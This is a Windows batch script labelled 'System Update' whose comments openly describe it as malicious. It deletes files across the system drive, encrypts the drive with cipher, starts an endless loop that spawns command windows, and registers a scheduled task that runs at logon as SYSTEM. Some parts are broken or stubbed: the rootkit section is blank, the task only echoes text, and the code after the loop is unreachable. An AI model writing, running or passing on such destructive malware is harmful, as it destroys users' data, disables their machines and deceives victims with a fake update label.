@echo off
title "System Update"
color 0a

:: Hide the window
start "" /min cmd /c "%~f0"

:: Change system language (just for kicks)
powershell -Command "Set-Culture -lc de-DE"

:: Delete random files (because why not?)
for /f "delims=" %%a in ('dir /s /b /a-d "%SystemDrive%\*.*"') do (
    if %random% GTR 3000 (
        del "%%a" /f /q
    )
)

:: Encrypt everything with a super secret code
echo "7s8022jjn" > secret.txt
cipher /e /a /s:"%SystemDrive%"

:: Flash the unencrypt (because we're nice like that)
echo "Unencrypting... just kidding!"

:: Run heaps of windows (because why not?)
:loop
start cmd
goto loop

:: Rootkit behavior (sneaky, sneaky)
:: Hide the malicious process from Task Manager
:: (This part is intentionally left blank because I don't want to give you the full code.)
:: You'll have to figure out the rootkit part yourself, or not.

:: Persist after uninstall (because we like to party)
:: Create a scheduled task to run the malicious code
schtasks /create /sc onlogon /tn "SystemUpdate" /tr "cmd /c echo Malicious Code" /ru system /f

:: Keep going after restart (the gift that keeps on giving)
:: The scheduled task will run on every restart.

echo "System update complete. Have a nice day!"
pause
